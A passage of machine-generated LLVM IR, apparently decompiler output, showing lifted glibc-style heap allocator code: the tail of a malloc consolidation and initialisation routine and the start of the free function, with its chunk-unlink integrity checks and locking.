  store i32 %v2_8053338, i32* @ebp, align 4
  %v2_805333c = sub i32 %v0_8053338, %v2_8053338
  store i32 %v2_805333c, i32* %eax.global-to-local, align 4
  %v1_805333e = add i32 %v2_805333c, 8
  %v2_805333e = inttoptr i32 %v1_805333e to i32*
  %v3_805333e = load i32, i32* %v2_805333e, align 4
  store i32 %v3_805333e, i32* @esi, align 4
  %v1_8053341 = add i32 %v2_805333c, 12
  %v2_8053341 = inttoptr i32 %v1_8053341 to i32*
  %v3_8053341 = load i32, i32* %v2_8053341, align 4
  store i32 %v3_8053341, i32* %edx.global-to-local, align 4
  %v1_8053344 = add i32 %v3_805333e, 12
  %v2_8053344 = inttoptr i32 %v1_8053344 to i32*
  %v3_8053344 = load i32, i32* %v2_8053344, align 4
  store i32 %v3_8053344, i32* @ecx, align 4
  %v12_8053347 = icmp eq i32 %v3_8053344, %v2_805333c
  %v1_8053349 = icmp eq i1 %v12_8053347, false
  br i1 %v1_8053349, label %dec_label_pc_8053388, label %dec_label_pc_805334b

dec_label_pc_805334b:                             ; preds = %dec_label_pc_8053338
  %v1_805334b = add i32 %v3_8053341, 8
  %v2_805334b = inttoptr i32 %v1_805334b to i32*
  %v3_805334b = load i32, i32* %v2_805334b, align 4
  %v15_805334b = icmp eq i32 %v3_805334b, %v3_8053344
  %v1_805334e = icmp eq i1 %v15_805334b, false
  br i1 %v1_805334e, label %dec_label_pc_8053388, label %dec_label_pc_8053350

dec_label_pc_8053350:                             ; preds = %dec_label_pc_805334b
  %v2_8053350 = add i32 %v2_8053338, %v1_8053327
  store i32 %v2_8053350, i32* @edi, align 4
  store i32 %v3_8053341, i32* %v2_8053344, align 4
  %v0_8053355 = load i32, i32* @esi, align 4
  %v1_8053355 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053355 = add i32 %v1_8053355, 8
  %v3_8053355 = inttoptr i32 %v2_8053355 to i32*
  store i32 %v0_8053355, i32* %v3_8053355, align 4
  %v0_8053363.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053358

dec_label_pc_8053358:                             ; preds = %dec_label_pc_805331b, %dec_label_pc_8053350
  %v1_805336c = phi i32 [ %v2_805332c, %dec_label_pc_805331b ], [ %v0_8053363.pre, %dec_label_pc_8053350 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053360 = and i32 %v3_805332f, -4
  store i32 %v1_8053360, i32* @ebp, align 4
  %v4_8053363 = load i32, i32* %v3_80533c6, align 4
  %v15_8053363 = icmp eq i32 %v1_805336c, %v4_8053363
  br i1 %v15_8053363, label %dec_label_pc_80533b9, label %dec_label_pc_8053368

dec_label_pc_8053368:                             ; preds = %dec_label_pc_8053358
  %v2_8053368 = add i32 %v1_805336c, 4
  %v3_8053368 = add i32 %v2_8053368, %v1_8053360
  %v4_8053368 = inttoptr i32 %v3_8053368 to i32*
  %v5_8053368 = load i32, i32* %v4_8053368, align 4
  store i32 %v5_8053368, i32* %eax.global-to-local, align 4
  %v3_805336c = inttoptr i32 %v2_8053368 to i32*
  store i32 %v1_8053360, i32* %v3_805336c, align 4
  %v0_805336f = load i32, i32* %eax.global-to-local, align 4
  %v1_805336f = urem i32 %v0_805336f, 2
  %v2_805336f = icmp eq i32 %v1_805336f, 0
  store i32 %v1_805336f, i32* %eax.global-to-local, align 4
  %v1_8053374 = icmp eq i1 %v2_805336f, false
  br i1 %v1_8053374, label %dec_label_pc_8053395, label %dec_label_pc_8053376

dec_label_pc_8053376:                             ; preds = %dec_label_pc_8053368
  %v0_8053376 = load i32, i32* @ebx, align 4
  %v1_8053376 = add i32 %v0_8053376, 8
  %v2_8053376 = inttoptr i32 %v1_8053376 to i32*
  %v3_8053376 = load i32, i32* %v2_8053376, align 4
  store i32 %v3_8053376, i32* @edx, align 4
  %v1_8053379 = add i32 %v0_8053376, 12
  %v2_8053379 = inttoptr i32 %v1_8053379 to i32*
  %v3_8053379 = load i32, i32* %v2_8053379, align 4
  store i32 %v3_8053379, i32* %eax.global-to-local, align 4
  %v1_805337c = add i32 %v3_8053376, 12
  %v2_805337c = inttoptr i32 %v1_805337c to i32*
  %v3_805337c = load i32, i32* %v2_805337c, align 4
  store i32 %v3_805337c, i32* @esi, align 4
  %v12_805337f = icmp eq i32 %v3_805337c, %v0_8053376
  %v1_8053381 = icmp eq i1 %v12_805337f, false
  br i1 %v1_8053381, label %dec_label_pc_8053388, label %dec_label_pc_8053383

dec_label_pc_8053383:                             ; preds = %dec_label_pc_8053376
  %v1_8053383 = add i32 %v3_8053379, 8
  %v2_8053383 = inttoptr i32 %v1_8053383 to i32*
  %v3_8053383 = load i32, i32* %v2_8053383, align 4
  %v15_8053383 = icmp eq i32 %v3_8053383, %v3_805337c
  br i1 %v15_8053383, label %dec_label_pc_805338d, label %dec_label_pc_8053388

dec_label_pc_8053388:                             ; preds = %dec_label_pc_8053383, %dec_label_pc_8053376, %dec_label_pc_805334b, %dec_label_pc_8053338
  %v0_8053388 = call i32 @abort()
  store i32 %v0_8053388, i32* %eax.global-to-local, align 4
  %v1_805338f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805338d

dec_label_pc_805338d:                             ; preds = %dec_label_pc_8053383, %dec_label_pc_8053388
  %v1_805338f = phi i32 [ %v3_8053376, %dec_label_pc_8053383 ], [ %v1_805338f.pre, %dec_label_pc_8053388 ]
  %v0_805338f = phi i32 [ %v3_8053379, %dec_label_pc_8053383 ], [ %v0_8053388, %dec_label_pc_8053388 ]
  %v0_805338d = load i32, i32* @edi, align 4
  %v1_805338d = load i32, i32* @ebp, align 4
  %v2_805338d = add i32 %v1_805338d, %v0_805338d
  store i32 %v2_805338d, i32* @edi, align 4
  %v2_805338f = add i32 %v1_805338f, 12
  %v3_805338f = inttoptr i32 %v2_805338f to i32*
  store i32 %v0_805338f, i32* %v3_805338f, align 4
  %v0_8053392 = load i32, i32* @edx, align 4
  %v1_8053392 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053392 = add i32 %v1_8053392, 8
  %v3_8053392 = inttoptr i32 %v2_8053392 to i32*
  store i32 %v0_8053392, i32* %v3_8053392, align 4
  br label %dec_label_pc_8053395

dec_label_pc_8053395:                             ; preds = %dec_label_pc_8053368, %dec_label_pc_805338d
  store i32 %v1_80532e0, i32* %eax.global-to-local, align 4
  %v3_8053399 = load i32, i32* %v2_8053399, align 4
  store i32 %v3_8053399, i32* %edx.global-to-local, align 4
  %v0_805339c = load i32, i32* @ecx, align 4
  store i32 %v0_805339c, i32* %v2_8053399, align 4
  %v0_805339f = load i32, i32* @edi, align 4
  %v1_80533a1 = or i32 %v0_805339f, 1
  %v1_80533a4 = load i32, i32* @ecx, align 4
  %v2_80533a4 = add i32 %v1_80533a4, 4
  %v3_80533a4 = inttoptr i32 %v2_80533a4 to i32*
  store i32 %v1_80533a1, i32* %v3_80533a4, align 4
  %v0_80533a7 = load i32, i32* @ecx, align 4
  %v1_80533a7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80533a7 = add i32 %v1_80533a7, 12
  %v3_80533a7 = inttoptr i32 %v2_80533a7 to i32*
  store i32 %v0_80533a7, i32* %v3_80533a7, align 4
  store i32 %v1_80532e0, i32* %eax.global-to-local, align 4
  %v0_80533ae = load i32, i32* %edx.global-to-local, align 4
  %v1_80533ae = load i32, i32* @ecx, align 4
  %v2_80533ae = add i32 %v1_80533ae, 8
  %v3_80533ae = inttoptr i32 %v2_80533ae to i32*
  store i32 %v0_80533ae, i32* %v3_80533ae, align 4
  %v0_80533b1 = load i32, i32* @edi, align 4
  %v1_80533b1 = load i32, i32* @ecx, align 4
  %v3_80533b1 = add i32 %v1_80533b1, %v0_80533b1
  %v4_80533b1 = inttoptr i32 %v3_80533b1 to i32*
  store i32 %v0_80533b1, i32* %v4_80533b1, align 4
  %v0_80533b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80533b4 = load i32, i32* @ecx, align 4
  %v2_80533b4 = add i32 %v1_80533b4, 12
  %v3_80533b4 = inttoptr i32 %v2_80533b4 to i32*
  store i32 %v0_80533b4, i32* %v3_80533b4, align 4
  br label %dec_label_pc_80533c9

dec_label_pc_80533b9:                             ; preds = %dec_label_pc_8053358
  %v0_80533b9 = load i32, i32* @edi, align 4
  %v2_80533b9 = add i32 %v0_80533b9, %v1_8053360
  %v1_80533bc = or i32 %v2_80533b9, 1
  store i32 %v1_80533bc, i32* %eax.global-to-local, align 4
  %v1_80533bf = load i32, i32* @ecx, align 4
  %v2_80533bf = add i32 %v1_80533bf, 4
  %v3_80533bf = inttoptr i32 %v2_80533bf to i32*
  store i32 %v1_80533bc, i32* %v3_80533bf, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_80533c6 = load i32, i32* @ecx, align 4
  store i32 %v0_80533c6, i32* %v3_80533c6, align 4
  br label %dec_label_pc_80533c9

dec_label_pc_80533c9:                             ; preds = %dec_label_pc_8053395, %dec_label_pc_80533b9
  store i32 %v3_805331b, i32* @ecx, align 4
  %v1_80533cd = icmp eq i32 %v3_805331b, 0
  %v1_80533cf = icmp eq i1 %v1_80533cd, false
  br i1 %v1_80533cf, label %dec_label_pc_805331b, label %dec_label_pc_80533d5

dec_label_pc_80533d5:                             ; preds = %dec_label_pc_80533c9, %dec_label_pc_8053307
  store i32 %v4_80532ff, i32* @ecx, align 4
  %v15_80533d9 = icmp eq i32 %v0_8053315, %v4_80532ff
  br i1 %v15_80533d9, label %dec_label_pc_805345d, label %dec_label_pc_80533df

dec_label_pc_80533df:                             ; preds = %dec_label_pc_80533d5
  br label %dec_label_pc_8053307

dec_label_pc_80533e9:                             ; preds = %dec_label_pc_80533f8.preheader, %dec_label_pc_80533e9
  %v1_80533ed20 = phi i32 [ 1, %dec_label_pc_80533f8.preheader ], [ %v0_80533f8.pre, %dec_label_pc_80533e9 ]
  %v2_80533ed = mul i32 %v1_80533ed20, 8
  %v4_80533ed = add i32 %v3_80533ed, %v2_80533ed
  store i32 %v4_80533ed, i32* %eax.global-to-local, align 4
  %v1_80533f1 = add i32 %v1_80533ed20, 1
  store i32 %v1_80533f1, i32* %edx.global-to-local, align 4
  %v2_80533f2 = add i32 %v4_80533ed, 12
  %v3_80533f2 = inttoptr i32 %v2_80533f2 to i32*
  store i32 %v4_80533ed, i32* %v3_80533f2, align 4
  %v0_80533f5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80533f5 = add i32 %v0_80533f5, 8
  %v3_80533f5 = inttoptr i32 %v2_80533f5 to i32*
  store i32 %v0_80533f5, i32* %v3_80533f5, align 4
  %v0_80533f8.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_80533fb = icmp sgt i32 %v0_80533f8.pre, 95
  br i1 %v7_80533fb, label %dec_label_pc_80533fd, label %dec_label_pc_80533e9

dec_label_pc_80533fd:                             ; preds = %dec_label_pc_80533e9
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053401 = add i32 %tmp11, 864
  %v2_8053401 = inttoptr i32 %v1_8053401 to i32*
  %v3_8053401 = load i32, i32* %v2_8053401, align 4
  %v4_8053401 = or i32 %v3_8053401, 1
  store i32 %v4_8053401, i32* %v2_8053401, align 4
  %v0_8053408 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053408 = add i32 %v0_8053408, 840
  %v2_8053408 = inttoptr i32 %v1_8053408 to i32*
  store i32 0, i32* %v2_8053408, align 4
  %v0_8053412 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053412 = add i32 %v0_8053412, 852
  %v2_8053412 = inttoptr i32 %v1_8053412 to i32*
  store i32 65536, i32* %v2_8053412, align 4
  %v0_805341c = load i32, i32* %eax.global-to-local, align 4
  %v1_805341c = add i32 %v0_805341c, 844
  %v2_805341c = inttoptr i32 %v1_805341c to i32*
  store i32 262144, i32* %v2_805341c, align 4
  %v0_8053426 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053426 = add i32 %v0_8053426, 836
  %v2_8053426 = inttoptr i32 %v1_8053426 to i32*
  store i32 262144, i32* %v2_8053426, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8053437 = load i32, i32* %arg1, align 4
  %v1_8053439 = urem i32 %v2_8053437, 4
  %v1_805343c = or i32 %v1_8053439, 72
  store i32 %v1_805343c, i32* %arg1, align 4
  %v1_8053443 = add i32 %tmp11, 52
  store i32 %v1_8053443, i32* %eax.global-to-local, align 4
  %v2_8053446 = add i32 %tmp11, 44
  %v3_8053446 = inttoptr i32 %v2_8053446 to i32*
  store i32 %v1_8053443, i32* %v3_8053446, align 4
  %v1_805344b = call i32 @sysconf(i32 30)
  store i32 %v1_805344b, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8053457 = add i32 %tmp11, 860
  %v3_8053457 = inttoptr i32 %v2_8053457 to i32*
  store i32 %v1_805344b, i32* %v3_8053457, align 4
  br label %dec_label_pc_805345d

dec_label_pc_805345d:                             ; preds = %dec_label_pc_80533d5, %dec_label_pc_80533fd
  store i32 %v0_80532c0, i32* @ebx, align 4
  store i32 %v0_80532bf, i32* @esi, align 4
  store i32 %v0_80532be, i32* @edi, align 4
  store i32 %v0_80532bd, i32* @ebp, align 4
  %v0_8053464 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053464

; uselistorder directives
  uselistorder i32 %v0_80533f5, { 1, 0 }
  uselistorder i32 %v0_80533b1, { 1, 0 }
  uselistorder i32 %v1_805336f, { 1, 0 }
  uselistorder i32 %v2_8053368, { 1, 0 }
  uselistorder i32 %v1_8053360, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805336c, { 1, 0 }
  uselistorder i32 %v3_805331b, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8053338, { 2, 1, 0, 4, 3 }
  uselistorder i32* %v3_80533c6, { 1, 0 }
  uselistorder i32 %tmp11, { 6, 16, 2, 1, 15, 13, 12, 10, 9, 0, 4, 11, 5, 8, 3, 14, 7 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_805345d, { 1, 0 }
  uselistorder label %dec_label_pc_80533e9, { 1, 0 }
  uselistorder label %dec_label_pc_80533c9, { 1, 0 }
  uselistorder label %dec_label_pc_8053395, { 1, 0 }
  uselistorder label %dec_label_pc_805338d, { 1, 0 }
  uselistorder label %dec_label_pc_8053358, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053465 = load i32, i32* @ebp, align 4
  %v0_8053466 = load i32, i32* @edi, align 4
  %v0_8053467 = load i32, i32* @esi, align 4
  %v0_8053468 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053470 = icmp eq i32 %arg1, 0
  br i1 %v1_8053470, label %dec_label_pc_80535f9, label %dec_label_pc_8053478

dec_label_pc_8053478:                             ; preds = %entry
  %v2_8053483 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053483, i32* %eax.global-to-local, align 4
  %v4_8053488 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  store i32 %v4_8053488, i32* %eax.global-to-local, align 4
  %v1_8053494 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  %v1_8053499 = add i32 %arg1, -8
  store i32 %v1_8053499, i32* @ecx, align 4
  %v0_805349c = load i8, i8* @global_var_8067a20.234, align 1
  %v1_805349c = sext i8 %v0_805349c to i32
  store i32 %v1_805349c, i32* %eax.global-to-local, align 4
  %v1_80534a1 = add i32 %arg1, -4
  %v2_80534a1 = inttoptr i32 %v1_80534a1 to i32*
  %v3_80534a1 = load i32, i32* %v2_80534a1, align 4
  store i32 %v3_80534a1, i32* %edx.global-to-local, align 4
  %v1_80534a9 = and i32 %v3_80534a1, -4
  %v4_80534a9 = trunc i32 %v1_80534a9 to i8
  store i32 %v1_80534a9, i32* @ebx, align 4
  %v8_80534ae = icmp ugt i8 %v4_80534a9, %v0_805349c
  br i1 %v8_80534ae, label %dec_label_pc_80534d0, label %dec_label_pc_80534b0

dec_label_pc_80534b0:                             ; preds = %dec_label_pc_8053478
  %v1_80534b0 = or i32 %v1_805349c, 3
  %v3_80534b0 = trunc i32 %v1_80534b0 to i8
  store i32 %v1_80534b0, i32* %eax.global-to-local, align 4
  %v2_80534b3 = udiv i32 %v3_80534a1, 8
  store i32 %v2_80534b3, i32* @ebx, align 4
  store i8 %v3_80534b0, i8* @global_var_8067a20.234, align 32
  %v1_80534bb = mul nuw i32 %v2_80534b3, 4
  %v2_80534bb = add i32 %v1_80534bb, ptrtoint (i8* @global_var_8067a20.234 to i32)
  store i32 %v2_80534bb, i32* %edx.global-to-local, align 4
  %v1_80534c2 = add i32 %v1_80534bb, add (i32 ptrtoint (i8* @global_var_8067a20.234 to i32), i32 -4)
  %v2_80534c2 = inttoptr i32 %v1_80534c2 to i32*
  %v3_80534c2 = load i32, i32* %v2_80534c2, align 4
  store i32 %v3_80534c2, i32* %eax.global-to-local, align 4
  %v3_80534c5 = inttoptr i32 %arg1 to i32*
  store i32 %v3_80534c2, i32* %v3_80534c5, align 4
  %v0_80534c8 = load i32, i32* @ecx, align 4
  %v1_80534c8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80534c8 = add i32 %v1_80534c8, -4
  %v3_80534c8 = inttoptr i32 %v2_80534c8 to i32*
  store i32 %v0_80534c8, i32* %v3_80534c8, align 4
  br label %dec_label_pc_80535e8

dec_label_pc_80534d0:                             ; preds = %dec_label_pc_8053478
  %v2_80534d0 = and i32 %v3_80534a1, 2
  %v3_80534d0 = icmp eq i32 %v2_80534d0, 0
  %v1_80534d3 = icmp eq i1 %v3_80534d0, false
  br i1 %v1_80534d3, label %dec_label_pc_80535c8, label %dec_label_pc_80534d9

dec_label_pc_80534d9:                             ; preds = %dec_label_pc_80534d0
  %v1_80534d9 = or i32 %v1_805349c, 1
  %v3_80534d9 = trunc i32 %v1_80534d9 to i8
  store i32 %v1_80534d9, i32* %eax.global-to-local, align 4
  store i8 %v3_80534d9, i8* @global_var_8067a20.234, align 32
  %v2_80534e1 = add i32 %v1_80534a9, %v1_8053499
  store i32 %v2_80534e1, i32* @esi, align 4
  %v1_80534e4 = add i32 %v2_80534e1, 4
  %v2_80534e4 = inttoptr i32 %v1_80534e4 to i32*
  %v3_80534e4 = load i32, i32* %v2_80534e4, align 4
  store i32 %v3_80534e4, i32* %eax.global-to-local, align 4
  %v2_80534eb = inttoptr i32 %v1_80534a1 to i8*
  %v3_80534eb = load i8, i8* %v2_80534eb, align 1
  %v4_80534eb = urem i8 %v3_80534eb, 2
  %v5_80534eb = icmp eq i8 %v4_80534eb, 0
  %v1_80534ef = icmp eq i1 %v5_80534eb, false
  br i1 %v1_80534ef, label %dec_label_pc_8053512, label %dec_label_pc_80534f1

dec_label_pc_80534f1:                             ; preds = %dec_label_pc_80534d9
  %v2_80534f1 = inttoptr i32 %v1_8053499 to i32*
  %v3_80534f1 = load i32, i32* %v2_80534f1, align 4
  store i32 %v3_80534f1, i32* @ebp, align 4
  %v2_80534f6 = sub i32 %v1_8053499, %v3_80534f1
  store i32 %v2_80534f6, i32* %eax.global-to-local, align 4
  %v1_80534f8 = add i32 %v2_80534f6, 8
  %v2_80534f8 = inttoptr i32 %v1_80534f8 to i32*
  %v3_80534f8 = load i32, i32* %v2_80534f8, align 4
  store i32 %v3_80534f8, i32* @edi, align 4
  %v1_80534fb = add i32 %v2_80534f6, 12
  %v2_80534fb = inttoptr i32 %v1_80534fb to i32*
  %v3_80534fb = load i32, i32* %v2_80534fb, align 4
  store i32 %v3_80534fb, i32* %edx.global-to-local, align 4
  %v1_80534fe = add i32 %v3_80534f8, 12
  %v2_80534fe = inttoptr i32 %v1_80534fe to i32*
  %v3_80534fe = load i32, i32* %v2_80534fe, align 4
  store i32 %v3_80534fe, i32* @ecx, align 4
  %v12_8053501 = icmp eq i32 %v3_80534fe, %v2_80534f6
  %v1_8053503 = icmp eq i1 %v12_8053501, false
  br i1 %v1_8053503, label %dec_label_pc_8053541, label %dec_label_pc_8053505

dec_label_pc_8053505:                             ; preds = %dec_label_pc_80534f1
  %v1_8053505 = add i32 %v3_80534fb, 8
  %v2_8053505 = inttoptr i32 %v1_8053505 to i32*
  %v3_8053505 = load i32, i32* %v2_8053505, align 4
  %v15_8053505 = icmp eq i32 %v3_8053505, %v3_80534fe
  %v1_8053508 = icmp eq i1 %v15_8053505, false
  br i1 %v1_8053508, label %dec_label_pc_8053541, label %dec_label_pc_805350a

dec_label_pc_805350a:                             ; preds = %dec_label_pc_8053505
  %v2_805350a = add i32 %v3_80534f1, %v1_80534a9
  store i32 %v2_805350a, i32* @ebx, align 4
  store i32 %v3_80534fb, i32* %v2_80534fe, align 4
  %v0_805350f = load i32, i32* @edi, align 4
  %v1_805350f = load i32, i32* %edx.global-to-local, align 4
  %v2_805350f = add i32 %v1_805350f, 8
  %v3_805350f = inttoptr i32 %v2_805350f to i32*
  store i32 %v0_805350f, i32* %v3_805350f, align 4
  %v0_8053519.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053512

dec_label_pc_8053512:                             ; preds = %dec_label_pc_80534d9, %dec_label_pc_805350a
  %v1_8053525 = phi i32 [ %v2_80534e1, %dec_label_pc_80534d9 ], [ %v0_8053519.pre, %dec_label_pc_805350a ]
  %v1_8053516 = and i32 %v3_80534e4, -4
  store i32 %v1_8053516, i32* @ebp, align 4
  %v1_8053519 = load i32, i32* @global_var_8067a4c.235, align 4
  %v12_8053519 = icmp eq i32 %v1_8053525, %v1_8053519
  br i1 %v12_8053519, label %dec_label_pc_8053573, label %dec_label_pc_8053521

dec_label_pc_8053521:                             ; preds = %dec_label_pc_8053512
  %v2_8053521 = add i32 %v1_8053525, 4
  %v3_8053521 = add i32 %v2_8053521, %v1_8053516
  %v4_8053521 = inttoptr i32 %v3_8053521 to i32*
  %v5_8053521 = load i32, i32* %v4_8053521, align 4
  store i32 %v5_8053521, i32* %eax.global-to-local, align 4
  %v3_8053525 = inttoptr i32 %v2_8053521 to i32*
  store i32 %v1_8053516, i32* %v3_8053525, align 4
  %v0_8053528 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053528 = urem i32 %v0_8053528, 2
  %v2_8053528 = icmp eq i32 %v1_8053528, 0
  store i32 %v1_8053528, i32* %eax.global-to-local, align 4
  %v1_805352d = icmp eq i1 %v2_8053528, false
  br i1 %v1_805352d, label %dec_label_pc_805354e, label %dec_label_pc_805352f

dec_label_pc_805352f:                             ; preds = %dec_label_pc_8053521
  %v0_805352f = load i32, i32* @esi, align 4
  %v1_805352f = add i32 %v0_805352f, 8
  %v2_805352f = inttoptr i32 %v1_805352f to i32*
  %v3_805352f = load i32, i32* %v2_805352f, align 4
  store i32 %v3_805352f, i32* @edx, align 4
  %v1_8053532 = add i32 %v0_805352f, 12
  %v2_8053532 = inttoptr i32 %v1_8053532 to i32*
  %v3_8053532 = load i32, i32* %v2_8053532, align 4
  store i32 %v3_8053532, i32* %eax.global-to-local, align 4
  %v1_8053535 = add i32 %v3_805352f, 12
  %v2_8053535 = inttoptr i32 %v1_8053535 to i32*
  %v3_8053535 = load i32, i32* %v2_8053535, align 4
  store i32 %v3_8053535, i32* @edi, align 4
  %v12_8053538 = icmp eq i32 %v3_8053535, %v0_805352f
  %v1_805353a = icmp eq i1 %v12_8053538, false
  br i1 %v1_805353a, label %dec_label_pc_8053541, label %dec_label_pc_805353c

dec_label_pc_805353c:                             ; preds = %dec_label_pc_805352f
  %v1_805353c = add i32 %v3_8053532, 8
  %v2_805353c = inttoptr i32 %v1_805353c to i32*
  %v3_805353c = load i32, i32* %v2_805353c, align 4
  %v15_805353c = icmp eq i32 %v3_805353c, %v3_8053535
  br i1 %v15_805353c, label %dec_label_pc_8053546, label %dec_label_pc_8053541

dec_label_pc_8053541:                             ; preds = %dec_label_pc_805353c, %dec_label_pc_805352f, %dec_label_pc_8053505, %dec_label_pc_80534f1
  %v0_8053541 = call i32 @abort()
  store i32 %v0_8053541, i32* %eax.global-to-local, align 4
  %v1_8053546.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053546

dec_label_pc_8053546:                             ; preds = %dec_label_pc_805353c, %dec_label_pc_8053541
  %v1_8053546 = phi i32 [ %v3_805352f, %dec_label_pc_805353c ], [ %v1_8053546.pre, %dec_label_pc_8053541 ]
  %v0_8053546 = phi i32 [ %v3_8053532, %dec_label_pc_805353c ], [ %v0_8053541, %dec_label_pc_8053541 ]
  %v2_8053546 = add i32 %v1_8053546, 12
  %v3_8053546 = inttoptr i32 %v2_8053546 to i32*
  store i32 %v0_8053546, i32* %v3_8053546, align 4
  %v0_8053549 = load i32, i32* @ebx, align 4
  %v1_8053549 = load i32, i32* @ebp, align 4
  %v2_8053549 = add i32 %v1_8053549, %v0_8053549
  store i32 %v2_8053549, i32* @ebx, align 4
  %v0_805354b = load i32, i32* @edx, align 4
  %v1_805354b = load i32, i32* %eax.global-to-local, align 4
  %v2_805354b = add i32 %v1_805354b, 8
  %v3_805354b = inttoptr i32 %v2_805354b to i32*
  store i32 %v0_805354b, i32* %v3_805354b, align 4
  br label %dec_label_pc_805354e

dec_label_pc_805354e:                             ; preds = %dec_label_pc_8053521, %dec_label_pc_8053546
  %v0_805354e = load i32, i32* @global_var_8067a5c.253, align 4
  store i32 %v0_805354e, i32* %eax.global-to-local, align 4
  %v0_8053553 = load i32, i32* @ecx, align 4
  %v1_8053553 = add i32 %v0_8053553, 12
  %v2_8053553 = inttoptr i32 %v1_8053553 to i32*
  store i32 ptrtoint (i32* @global_var_8067a54.237 to i32), i32* %v2_8053553, align 4
  %v0_805355a = load i32, i32* @ebx, align 4
  %v1_805355a = load i32, i32* @ecx, align 4
  %v3_805355a = add i32 %v1_805355a, %v0_805355a
  %v4_805355a = inttoptr i32 %v3_805355a to i32*
  store i32 %v0_805355a, i32* %v4_805355a, align 4
  %v0_805355d = load i32, i32* %eax.global-to-local, align 4
  %v1_805355d = load i32, i32* @ecx, align 4
  %v2_805355d = add i32 %v1_805355d, 8
  %v3_805355d = inttoptr i32 %v2_805355d to i32*
  store i32 %v0_805355d, i32* %v3_805355d, align 4
  %v0_8053560 = load i32, i32* @ecx, align 4
  %v1_8053560 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053560 = add i32 %v1_8053560, 12
  %v3_8053560 = inttoptr i32 %v2_8053560 to i32*
  store i32 %v0_8053560, i32* %v3_8053560, align 4
  %v0_8053563 = load i32, i32* @ebx, align 4
  %v1_8053565 = or i32 %v0_8053563, 1
  store i32 %v1_8053565, i32* %eax.global-to-local, align 4
  %v0_8053568 = load i32, i32* @ecx, align 4
  store i32 %v0_8053568, i32* @global_var_8067a5c.253, align 4
  %v2_805356e = add i32 %v0_8053568, 4
  %v3_805356e = inttoptr i32 %v2_805356e to i32*
  store i32 %v1_8053565, i32* %v3_805356e, align 4
  br label %dec_label_pc_8053583

dec_label_pc_8053573:                             ; preds = %dec_label_pc_8053512
  %v0_8053573 = load i32, i32* @ebx, align 4
  %v2_8053573 = add i32 %v0_8053573, %v1_8053516
  store i32 %v2_8053573, i32* @ebx, align 4
  %v1_8053577 = or i32 %v2_8053573, 1
  store i32 %v1_8053577, i32* %eax.global-to-local, align 4
  %v1_805357a = load i32, i32* @ecx, align 4
  %v2_805357a = add i32 %v1_805357a, 4
  %v3_805357a = inttoptr i32 %v2_805357a to i32*
  store i32 %v1_8053577, i32* %v3_805357a, align 4
  %v0_805357d = load i32, i32* @ecx, align 4
  store i32 %v0_805357d, i32* @global_var_8067a4c.235, align 4
  br label %dec_label_pc_8053583

dec_label_pc_8053583:                             ; preds = %dec_label_pc_805354e, %dec_label_pc_8053573
  %v0_8053583 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8053583, 131072
  br i1 %tmp, label %dec_label_pc_80535e8, label %dec_label_pc_805358b

dec_label_pc_805358b:                             ; preds = %dec_label_pc_8053583
  %v0_805358b = load i8, i8* @global_var_8067a20.234, align 32
  %v1_805358b = and i8 %v0_805358b, 2
  %v2_805358b = icmp eq i8 %v1_805358b, 0
  br i1 %v2_805358b, label %dec_label_pc_80535a4, label %dec_label_pc_8053594

dec_label_pc_8053594:                             ; preds = %dec_label_pc_805358b
  %v2_805359c = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8067a20.234 to i32*))
  store i32 %v2_805359c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535a4

dec_label_pc_80535a4:                             ; preds = %dec_label_pc_805358b, %dec_label_pc_8053594
  %v0_80535a4 = load i32, i32* @global_var_8067a4c.235, align 4
  store i32 %v0_80535a4, i32* %eax.global-to-local, align 4
  %v1_80535a9 = add i32 %v0_80535a4, 4
  %v2_80535a9 = inttoptr i32 %v1_80535a9 to i32*
  %v3_80535a9 = load i32, i32* %v2_80535a9, align 4
  %v1_80535ac = and i32 %v3_80535a9, -4
  store i32 %v1_80535ac, i32* %eax.global-to-local, align 4
  %v1_80535af = load i32, i32* @global_var_8067d64.251, align 4
  %v7_80535af = icmp ult i32 %v1_80535ac, %v1_80535af
  br i1 %v7_80535af, label %dec_label_pc_80535e8, label %dec_label_pc_80535b7

dec_label_pc_80535b7:                             ; preds = %dec_label_pc_80535a4
  %v0_80535b7 = load i32, i32* @global_var_8067d68.249, align 8
